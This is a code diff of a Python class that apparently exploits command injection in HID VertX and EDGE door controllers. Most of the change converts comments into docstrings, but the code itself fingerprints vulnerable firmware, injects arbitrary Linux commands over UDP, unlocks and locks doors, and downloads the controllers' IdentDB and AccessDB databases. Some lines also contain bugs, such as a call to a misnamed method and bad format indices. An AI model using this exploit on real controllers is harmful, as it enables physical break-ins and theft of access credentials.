@@ -31,8 +31,9 @@ except:
 
 
 class Actions(object):
-	"""Perform action on VertX controller"""
-
+	"""
+	Perform actions on VertX controller.
+	"""
 	def __init__(self, ip, username=None, password=None):
 		self.utils = Helpers()
 		self.session = requests.Session()
@@ -53,8 +54,13 @@ class Actions(object):
 
 		self.vertx_info = {}
 
-	# Discover VertX controllers
 	def discover(self):
+		"""
+		Discover VertX controllers on the local network or range of IP addresses.
+		Returns
+		----------
+			controllers : list
+		"""
 		controllers = []
 
 		# Send discover request to local broadcast network
@@ -76,8 +82,16 @@ class Actions(object):
 
 		return controllers
 
-	# Pull info about VertX controller
 	def fingerprint(self):
+		"""
+		Return information about the VertX controller.
+		This also checks the firmware version and determines if the controller is vulnerable to command injection.
+			Legacy VertX controllers patched with firmware > 2.2.7.568
+			VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
+		Returns
+		----------
+			vertx_info : dict
+		"""
 		response = self._send_command(self.DISCOVER)
 		if response:
 			response_data = response[0].split(';')
@@ -90,7 +104,6 @@ class Actions(object):
 			self.vertx_info['external_ip'] = response[1][0]
 			self.vertx_info['mac'] = response_data[2]
 
-			# Check if VertX controller is vulnerable
 			switch = {
 				'E400': 3511483,  # EDGEPlus
 				'EH400': 3511483,  # EDGE EVO
@@ -103,9 +116,6 @@ class Actions(object):
 			}
 
 			patched_version = switch.get(self.vertx_info['model'], 0)
-
-			# Legacy VertX controllers patched with firmware > 2.2.7.568
-			# VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
 			if int(self.vertx_info['version'].replace('.', '')) <= patched_version:
 				self.vertx_info['vulnerable'] = True
 			else:
@@ -113,8 +123,13 @@ class Actions(object):
 
 		return self.vertx_info
 
-	# Unlock doors using command injection or the web interface
 	def unlock(self):
+		"""
+		Using command injection, unlock doors connected to the VertX controller.
+		Returns
+		----------
+			response : str
+		"""
 		commands = [
 			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(self.vertx_info['model']),
 			'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
@@ -131,14 +146,25 @@ class Actions(object):
 
 		return response
 
-	# Unlock doors using the web interface
 	def web_unlock(self):
+		"""
+		Using the web interface, unlock doors connected to the VertX controller.
+		Returns
+		----------
+			response : str
+		"""
 		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
 		response = self._web_request(url)
+
 		return response
 
-	# Lock doors using command injection or the web interface
 	def lock(self):
+		"""
+		Using command injection, lock doors connected to the VertX controller.
+		Returns
+		----------
+			response : str
+		"""
 		commands = [
 			'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
 			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(self.vertx_info['model']),
@@ -155,20 +181,42 @@ class Actions(object):
 
 		return response
 
-	# Lock doors using the web interface
 	def web_lock(self):
+		"""
+		Using the web interface, lock doors connected to the VertX controller.
+		Returns
+		----------
+			response : str
+		"""
 		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
 		response = self.web_request(url)
+
 		return response
 
-	# Send raw Linux command
 	def raw(self, command):
+		"""
+		Send 'raw' native Linux command to be run on the VertX controller.
+		Parameters
+		----------
+		command : str
+			Linux command.
+			Example : ping -c 3 192.168.1.39
+		Returns
+		----------
+			response : str
+		"""
 		payload = "{0};1`{1}`;".format(self.vertx_info['mac'], command)
 		response = self._send_command(self.BLINK_ON, payload)
+
 		return response
 
-	# Download databases
 	def download(self):
+		"""
+		Download IdentDB and AccessDB from VertX controller.
+		Returns
+		----------
+			databases : dict
+		"""
 		databases = {
 			'IdentDB': None,
 			'AccessDB': None
@@ -215,12 +263,28 @@ class Actions(object):
 
 		return databases
 
-	# Split payload because of 41 character length limit
 	def _chunk(self, commands, length=24):
+		"""
+		Split commands into chunks because of 41 character length limit with command injection.
+		Parameters
+		----------
+			commands : list
+				Commands to send to the VertX controller.
+			length : int
+				Lengeth of chunks.
+		Returns
+		----------
+			list
+		"""
 		return list('!'.join(commands)[0 + i:length + i] for i in range(0, len('!'.join(commands)), length))
 
-	# Send payload and format it after it has been uploaded
 	def _execute_payload(self):
+		"""
+		Format the uploaded script, then execute.
+		Returns
+		----------
+			response : str
+		"""
 		commands = {
 			'format': [
 				"{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(self.vertx_info['mac']),
@@ -245,8 +309,19 @@ class Actions(object):
 
 		return response
 
-	# Send commands to VertX controller
 	def _send_command(self, command, payload=None):
+		"""
+		Send a command to VertX controller.
+		Parameters
+		----------
+			commands : str
+				Command to send to the VertX controller.
+			payload : str
+				Command injection payload.
+		Returns
+		----------
+			response : str
+		"""
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		s.settimeout(5)
 
@@ -268,8 +343,17 @@ class Actions(object):
 
 		return response
 
-	# VertX actions through web interface
 	def _web_request(self, url):
+		"""
+		Trigger door unlock and lock through the web interface.
+		Parameters
+		----------
+			url : str
+				URL endpont to trigger on the VertX web interface.
+		Returns
+		----------
+			response : str
+		"""
 		try:
 			request = self.session.get(
 				url,
